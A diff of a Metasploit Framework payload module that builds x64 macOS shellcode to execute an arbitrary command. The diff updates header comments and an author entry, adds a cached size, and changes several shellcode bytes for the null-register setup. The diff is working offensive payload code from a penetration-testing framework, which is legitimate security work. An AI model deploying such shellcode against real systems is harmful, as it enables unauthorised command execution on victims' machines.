@@ -1,14 +1,14 @@
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 
 require 'msf/core'
 
 module Metasploit3
+
+  CachedSize = 23
 
   include Msf::Payload::Single
 
@@ -17,7 +17,7 @@ module Metasploit3
       'Name'          => 'OS X x64 Execute Command',
       'Description'   => 'Execute an arbitrary command',
       'Author'        => [ 'argp <argp[at]census-labs.com>',
-                           'joev <jvennix[at]rapid7.com>' ],
+                           'joev' ],
       'License'       => MSF_LICENSE,
       'Platform'      => 'osx',
       'Arch'          => ARCH_X86_64
@@ -38,13 +38,13 @@ module Metasploit3
     arg_str = cmd_parts.map { |a| "#{a}\x00" }.join
     call = "\xe8" + [arg_str.length].pack('V')
     payload =
-      "\x48\x31\xc0" +                                # xor rax, rax
+      "\x48\x31\xd2"+                                 # xor rdx, rdx
       call +                                          # call CMD.len
       arg_str  +                                      # CMD
       "\x5f" +                                        # pop rdi
       if cmd_parts.length > 1
         "\x48\x89\xf9" +                            # mov rcx, rdi
-        "\x50" +                                    # push null
+        "\x52" +                                    # push rdx (null)
         # for each arg, push its current memory location on to the stack
         cmd_parts[1..-1].each_with_index.map do |arg, idx|
           "\x48\x81\xc1" +                        # add rcx + ...
@@ -52,7 +52,7 @@ module Metasploit3
           "\x51"                                  # push rcx (build str array)
         end.join
       else
-        "\x50"                                      # push null
+        "\x52"                                      # push rdx (null)
       end +
       "\x57"+                                         # push rdi
       "\x48\x89\xe6"+	                                # mov rsi, rsp
